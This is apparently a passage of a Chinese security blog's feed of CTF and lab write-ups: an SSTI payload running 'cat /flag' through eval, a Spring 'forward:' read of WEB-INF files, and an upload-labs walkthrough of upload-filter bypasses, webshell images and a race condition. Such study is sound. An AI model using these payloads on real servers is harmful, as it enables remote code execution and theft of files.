class="hljs-keyword">if</span> <span class="hljs-string">&quot;eval&quot;</span> <span class="hljs-keyword">in</span> b.keys() %&#125; <span class="hljs-comment"># 如果b中有eval</span><br>                       &#123;&#123;b.<span class="hljs-built_in">eval</span>(request.values.code)&#125;&#125;<span class="hljs-comment"># 执行code中的命令</span><br>                 &#123;% endif %&#125;   <br>            &#123;% endif %&#125;<br>        &#123;% endfor %&#125;<br>    &#123;% endif %&#125;<br>&#123;% endfor %&#125;<br></code></pre></div></td></tr></table></figure><p>之后发送post请求具体内容如下</p><figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">code</span>=__import__(<span class="hljs-string">&quot;os&quot;</span>).popen(<span class="hljs-string">&quot;cat /flag&quot;</span>).read()<br></code></pre></div></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/60eac8a25132923bf8be5bf8.png"></p><p>最后成功获取了flag。</p>]]></content>
    
    
    <categories>
      
      <category>信安 CTF Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
      <tag>ssti</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>gxyd-初学Spring</title>
    <link href="/2021/07/09/%E4%BF%A1%E5%AE%89/CTF/Web/gxyd-%E5%88%9D%E5%AD%A6Spring/"/>
    <url>/2021/07/09/%E4%BF%A1%E5%AE%89/CTF/Web/gxyd-%E5%88%9D%E5%AD%A6Spring/</url>
    
    <content type="html"><![CDATA[<h1 id="gxyd-初学Spring"><a href="#gxyd-初学Spring" class="headerlink" title="gxyd-初学Spring"></a>gxyd-初学Spring</h1><h1 id="自我尝试"><a href="#自我尝试" class="headerlink" title="自我尝试"></a>自我尝试</h1><p>在拿到题目后首先查看源码，之后发现可用的链接只有两个。</p><p>链接内容如下/PageLoader.action?Page=views/index</p><p>之后利用bp抓包进行重放的尝试</p><p><img src="https://pic.imgdb.cn/item/60eac8c15132923bf8bec91f.png"></p><p>修改参数发现当前应该是WEB-INF目录下，但是后缀被固定为html</p><p><img src="https://pic.imgdb.cn/item/60eac8d25132923bf8bf06b4.png"></p><p>此时尝试绕过，一直在找怎么截断找spring的相关知识。。。</p><h1 id="题解查看"><a href="#题解查看" class="headerlink" title="题解查看"></a>题解查看</h1><p>在查看了题解之后发现是：利用后端采用了路径拼接的方式进行模板的渲染。其中程序使用了ModelAndView()函数来进行模板的渲染，并在/WEB-INF/web.xml中对文件路径的前缀与后缀进行了限制。许多开发人员对ModelAndView函数内部实现不够了解，ModelAndView函数在遇到“forward”前缀的参数时可以直接读取WAR包内的文件。</p><p>所以可以读取web利用forward:/WEB-INF/web.xml</p><p><img src="https://pic.imgdb.cn/item/60eac8e45132923bf8bf4549.png"></p><p>此时根据servlet-name下的dispatcher进一步获取内容读取dispatcher-servlet.xml,同样的方式进行读取。</p><p>获取内容：</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span> = <span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">   <span class="hljs-attr">xmlns:context</span> = <span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span></span><br><span class="hljs-tag">   <span class="hljs-attr">xmlns:xsi</span> = <span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">   <span class="hljs-attr">xsi:schemaLocation</span> = <span class="hljs-string">&quot;http://www.springframework.org/schema/beans     </span></span><br><span class="hljs-string"><span class="hljs-tag">   http://www.springframework.org/schema/beans/spring-beans-3.0.xsd</span></span><br><span class="hljs-string"><span class="hljs-tag">   http://www.springframework.org/schema/context </span></span><br><span class="hljs-string"><span class="hljs-tag">   http://www.springframework.org/schema/context/spring-context-3.0.xsd&quot;</span>&gt;</span><br><br>   <span class="hljs-tag">&lt;<span class="hljs-name">context:component-scan</span> <span class="hljs-attr">base-package</span> = <span class="hljs-string">&quot;com.chaitin&quot;</span> /&gt;</span><br>   <br>   <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">class</span> =<span class="hljs-string">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span> =<span class="hljs-string">&quot;prefix&quot;</span> <span class="hljs-attr">value</span> = <span class="hljs-string">&quot;/WEB-INF/&quot;</span> /&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span> =<span class="hljs-string">&quot;suffix&quot;</span> <span class="hljs-attr">value</span> = <span class="hljs-string">&quot;.html&quot;</span> /&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>根据内容可以得知具体的class包是com.chaitin，根据tomcat的目录结构访问classes/com/chaitin</p><p>但是最后的PageLoaderController.class还是不清楚如何获取的。<a href="http://host:port/PageLoader.action?Page=forward:/WEB-INF/classes/com/chaitin/PageLoaderController.class">http://host:port/PageLoader.action?Page=forward:/WEB-INF/classes/com/chaitin/PageLoaderController.class</a></p><p>最后下载下来搜索即可</p>]]></content>
    
    
    <categories>
      
      <category>信安 CTF Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Upload-Labs练习</title>
    <link href="/2021/07/09/%E4%BF%A1%E5%AE%89/%E9%9D%B6%E6%9C%BA/Upload-Labs%E7%BB%83%E4%B9%A0/"/>
    <url>/2021/07/09/%E4%BF%A1%E5%AE%89/%E9%9D%B6%E6%9C%BA/Upload-Labs%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="upload-labs靶场记录"><a href="#upload-labs靶场记录" class="headerlink" title="upload-labs靶场记录"></a>upload-labs靶场记录</h1><h1 id="php上传部分"><a href="#php上传部分" class="headerlink" title="php上传部分"></a>php上传部分</h1><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p>根据提示为前端js进行检查<br>1.直接利用F12进行检查将检查部分 checkFile()删除后直接上传php文件即可<br>2.先将文件后缀改为白名单中的文件类型，之后抓包进行修改为php。直接将图中部分改为php上传即可。<br><img src="https://img-blog.csdnimg.cn/20210307154906170.png#pic_center" alt="演示信息"></p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>根据源码提示</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"> <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/jpeg&#x27;</span>)<br>|| (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/png&#x27;</span>) <br>|| (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/gif&#x27;</span>)) &#123;<br></code></pre></div></td></tr></table></figure><p>是根据content-type进行过滤，在上传过程中将该部分改为image/jpeg即可<img src="https://img-blog.csdnimg.cn/20210307155426579.png#pic_center" alt="在这里插入图片描述"></p><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p>根据源码提示过滤了常见的文件类型</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;.asp&#x27;</span>,<span class="hljs-string">&#x27;.aspx&#x27;</span>,<span class="hljs-string">&#x27;.php&#x27;</span>,<span class="hljs-string">&#x27;.jsp&#x27;</span>);<br><span class="hljs-keyword">if</span>(!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>))<br></code></pre></div></td></tr></table></figure><p>将文件类型改为其他常见的php后缀 .phtml .phps .php3 .php5 .pht等</p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>根据源码提示过滤了大部分的的文件类型</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.php1&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.pHp1&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>但是没有过滤 .htaccess，将.htaccess文件内容修改为：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">AddType application/x-httpd-php .abc<br></code></pre></div></td></tr></table></figure><p>上传后服务器可以将后缀为abc的解析为php文件，结果如图：</p><p><img src="https://img-blog.csdnimg.cn/20210307160218603.png#pic_center" alt="在这里插入图片描述"></p><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>根据源码提示过滤了大部分的的文件类型，包括.htaccess<br>但是.ini没有在黑名单中了，参照第四关方法先设置后上传ini文件及abc文件即可</p><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p>根据源码提示，该关没有了统一小写字母的代码，将文件名后缀进行大小写的组合来进行绕过。</p><h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p>根据源码提示，该关没有了去除空格的检测，直接抓包后在文件后缀最后加上空格即可绕过。<br>相关知识：Windows系统下，对于文件名中空格会被作为空处理，程序中的检测代码却不能自动删除空格。从而绕过黑名单。即必须在抓包情况下增加空格。</p><h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p>根据源码提示，该关没有了去除末尾小数点的代码，直接抓包后在文件后缀最后加上 . 即可绕过。<br>相关知识：Windows系统下，文件后缀名最后一个点会被自动去除。</p><h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p>根据源码提示，该关没有了去除末尾::$DATA的代码，直接抓包后在文件后缀最后加上::$DATA即可绕过。<br>相关知识：php在windows下如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名不变</p><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p>根据源码提示，前面的方法都不可行。根据显示的代码：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br> <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br> <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br> <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br><span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span><br></code></pre></div></td></tr></table></figure><p>在后缀加上 . . 可以直接进行绕过，该方法基本适用于前面的关卡。</p><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p>根据根据源码提示</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>,<span class="hljs-string">&quot;ini&quot;</span>);<br><span class="hljs-variable">$file_name</span> = str_ireplace(<span class="hljs-variable">$deny_ext</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file_name</span>);<br></code></pre></div></td></tr></table></figure><p>是将黑名单中的后缀替换为空，将后缀名改为pphphp可以绕过</p><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p>前提要求：PHP %00截断（php版本 &lt; 5.3.4且magic_quotes_gpc=Off）<br>根据代码提示：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br></code></pre></div></td></tr></table></figure><p>可以利用$_GET[‘save_path’]进行存储路径的设置<br>进行抓包，将路径设置为：../upload/tmp.php%00<br><img src="https://img-blog.csdnimg.cn/20210307162810305.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>注意此时上传后，直接显示的图片路径需要删除后面部分才可以进行访问。</p><p>相关知识：在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束</p><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p>根据代码提示：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br></code></pre></div></td></tr></table></figure><p>可以利用$_POST[‘save_path’]进行存储路径的设置<br>进行抓包，将路径设置为：../upload/tmp.php%00 </p><p>由于post不会对%00进行自动解码，因此需要手动修改二进制</p><p>先在抓包文件添加/tmp.php之后在二进制中修改较为轻松。</p><p><img src="https://img-blog.csdnimg.cn/20210307163230181.png#pic_center" alt="在这里插入图片描述"><br>之后在二进制中修改将0d改为00</p><p><img src="https://img-blog.csdnimg.cn/20210307163344260.png#pic_center" alt="在这里插入图片描述"></p><h1 id="图片木马上传"><a href="#图片木马上传" class="headerlink" title="图片木马上传"></a>图片木马上传</h1><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p>根据代码提示：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$bin</span> = fread(<span class="hljs-variable">$file</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">//只读2字节</span><br><span class="hljs-variable">$strInfo</span> = @unpack(<span class="hljs-string">&quot;C2chars&quot;</span>, <span class="hljs-variable">$bin</span>);    <br><span class="hljs-variable">$typeCode</span> = intval(<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars1&#x27;</span>].<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars2&#x27;</span>]);      <br></code></pre></div></td></tr></table></figure><p>只读文件的前面两个字节，利用winhex在文件前面增加两个字节。</p><p>jpg为：FF D8<br>png为：89 50<br>gif为：47 49</p><p>上传成功后利用upload-labs本身设置的文件包含漏洞进行测试。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">//include.php</span><br>header(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))&#123;<br>    <span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    show_source(<span class="hljs-keyword">__file__</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>使用方法：include.php?file=upload/***(上传的图片木马路径)</p><p><img src="https://img-blog.csdnimg.cn/2021030717374510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p>根据源代码：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$info</span> = getimagesize(<span class="hljs-variable">$filename</span>);<br><span class="hljs-variable">$ext</span> = image_type_to_extension(<span class="hljs-variable">$info</span>[<span class="hljs-number">2</span>]);<br></code></pre></div></td></tr></table></figure><p>相关知识：</p><p>getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。<br>image_type_to_extension — 根据指定的图像类型返回对应的后缀名。<br>利用winhex在原本的图片文件下增加php代码，再利用文件包含进行测试。</p><p><img src="https://img-blog.csdnimg.cn/202103071742098.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p>前提条件：PHP要开启exif模块<br>根据代码，和15关相似也是在图片文件后面进行添加，之后利用文件包含漏洞进行测试。</p><p>相关知识：exif_imagetype()函数是PHP中的内置函数，用于确定图像的类型。</p><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p>根据代码提示：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">//jpeg</span><br><span class="hljs-variable">$im</span> = imagecreatefromjpeg(<span class="hljs-variable">$target_path</span>);<br>imagejpeg(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);<br><span class="hljs-comment">//png及gif类似代码</span><br></code></pre></div></td></tr></table></figure><p>先尝试随意上传一张图片，再将上传后的图片下载下来，将原来的图片和上传后的图片进行对比，找到没有改变的地方进行插入php语句。</p><p>相关知识：</p><p>imagecreatefromjpeg — 由文件或 URL 创建一个新图象。<br>imagejpeg() 从 image 图像以 filename 为文件名创建一个 JPEG 图像</p><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><p>根据网上的提示，该关卡考察条件竞争，再根据源代码可以了解到，文件会先上传服务器，再进行类型判断若在白名单则重命名，否则就进行删除。</p><p>此时利用brupsuite的intrude功能，设置上传文件和访问文件的两个攻击不断重复，直到可以访问出现的新文件。</p><p>上传文件的代码</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">//访问后会新生成一个php文件</span><br>fputs(fopen(<span class="hljs-string">&quot;tmp.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>),<span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>);<br></code></pre></div></td></tr></table></figure><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><p>根据源代码，可以知晓对于上传的文件先进行判断再进行上传，所以还是利用前面关卡的漏洞直接再图片文件后面增加php代码即可。</p><h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p>根据代码，该关卡我们可以自己定义文件名，并且没有详细的检测代码。<br>可以使用后缀大小写绕过，后缀加.，和抓包后加空格等等前面的方式进行上传。</p><h2 id="Pass-21"><a href="#Pass-21" class="headerlink" title="Pass-21"></a>Pass-21</h2><p>根据代码：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">//首先进行content-type检测</span><br><span class="hljs-variable">$allow_type</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;image/jpeg&#x27;</span>,<span class="hljs-string">&#x27;image/png&#x27;</span>,<span class="hljs-string">&#x27;image/gif&#x27;</span>);<br> <span class="hljs-keyword">if</span>(!in_array(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>],<span class="hljs-variable">$allow_type</span>))&#123;<br>     <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;禁止上传该类型文件!&quot;</span>;<br> &#125;<br> <span class="hljs-comment">//再对post上传的save_name进行判断</span><br> <span class="hljs-variable">$file</span> = <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>]) ? <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>] : <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>];<br> <span class="hljs-keyword">if</span> (!is_array(<span class="hljs-variable">$file</span>)) &#123;<br>     <span class="hljs-variable">$file</span> = explode(<span class="hljs-string">&#x27;.&#x27;</span>, strtolower(<span class="hljs-variable">$file</span>));<br> &#125;<br><br> <span class="hljs-variable">$ext</span> = end(<span class="hljs-variable">$file</span>);<br> <span class="hljs-variable">$allow_suffix</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br> <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$allow_suffix</span>)) &#123;<br>     <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;禁止上传该后缀文件!&quot;</span>;<br>&#125;<br> <span class="hljs-comment">//最后路径命名代码</span><br> <span class="hljs-variable">$file_name</span> = reset(<span class="hljs-variable">$file</span>) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$file</span>[count(<span class="hljs-variable">$file</span>) - <span class="hljs-number">1</span>];<br></code></pre></div></td></tr></table></figure><p>首先对于conten-type的绕过直接在抓包中修改即可。<br>根据代码，将save_name上传时修改为数组较为方便。<br>相关知识：<br>reset() 